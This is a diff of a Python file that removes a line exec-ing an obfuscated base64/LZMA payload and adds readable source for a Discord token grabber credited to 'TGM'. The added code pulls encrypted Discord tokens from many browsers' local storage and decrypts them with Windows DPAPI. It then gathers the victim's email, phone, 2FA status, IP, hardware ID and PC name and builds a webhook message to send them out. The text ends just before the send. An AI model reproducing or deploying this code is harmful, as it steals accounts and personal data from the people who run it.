@@ -1,1 +1,131 @@
-import base64, lzma; exec(compile(lzma.decompress(base64.b64decode(b'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')), "<string>", "exec"))
+from base64 import b64decode
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+from os import getlogin, listdir
+from json import loads
+from re import findall
+from urllib.request import Request, urlopen
+from subprocess import Popen, PIPE
+import requests, json, os
+from datetime import datetime
+
+tokens = []
+cleaned = []
+checker = []
+
+def decrypt(buff, master_key):
+    try:
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except:
+        return "Error"
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except: pass
+    return ip
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def get_token():
+    already_check = []
+    checker = []
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+    chrome = local + "\\Google\\Chrome\\User Data"
+    paths = {
+        'Discord': roaming + '\\discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Lightcord': roaming + '\\Lightcord',
+        'Discord PTB': roaming + '\\discordptb',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+        'Amigo': local + '\\Amigo\\User Data',
+        'Torch': local + '\\Torch\\User Data',
+        'Kometa': local + '\\Kometa\\User Data',
+        'Orbitum': local + '\\Orbitum\\User Data',
+        'CentBrowser': local + '\\CentBrowser\\User Data',
+        '7Star': local + '\\7Star\\7Star\\User Data',
+        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+        'Chrome': chrome + 'Default',
+        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
+        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Iridium': local + '\\Iridium\\User Data\\Default'
+    }
+    for platform, path in paths.items():
+        if not os.path.exists(path): continue
+        try:
+            with open(path + f"\\Local State", "r") as file:
+                key = loads(file.read())['os_crypt']['encrypted_key']
+                file.close()
+        except: continue
+        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
+            if not file.endswith(".ldb") and file.endswith(".log"): continue
+            else:
+                try:
+                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError: continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i.replace("\\", "")
+            elif i not in cleaned:
+                cleaned.append(i)
+        for token in cleaned:
+            try:
+                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
+            except IndexError == "Error": continue
+            checker.append(tok)
+            for value in checker:
+                if value not in already_check:
+                    already_check.append(value)
+                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
+                    try:
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+                    except: continue
+                    if res.status_code == 200:
+                        res_json = res.json()
+                        ip = getip()
+                        pc_username = os.getenv("UserName")
+                        pc_name = os.getenv("COMPUTERNAME")
+                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                        user_id = res_json['id']
+                        email = res_json['email']
+                        phone = res_json['phone']
+                        mfa_enabled = res_json['mfa_enabled']
+                        has_nitro = False
+                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+                        nitro_data = res.json()
+                        has_nitro = bool(len(nitro_data) > 0)
+                        days_left = 0
+                        if has_nitro:
+                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            days_left = abs((d2 - d1).days)
+                        embed = f"""**{user_name}** *({user_id})*\n
+> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
+> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
+> :piñata: __Token__\n\t`{tok}`\n
+*Made by TGM* **|** ||https://cracked.io/TGM||"""
+                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by TGM', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
+                        try:
+                            headers2 = {
+                                'Content-Type': 'application/json',
+                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+                            }
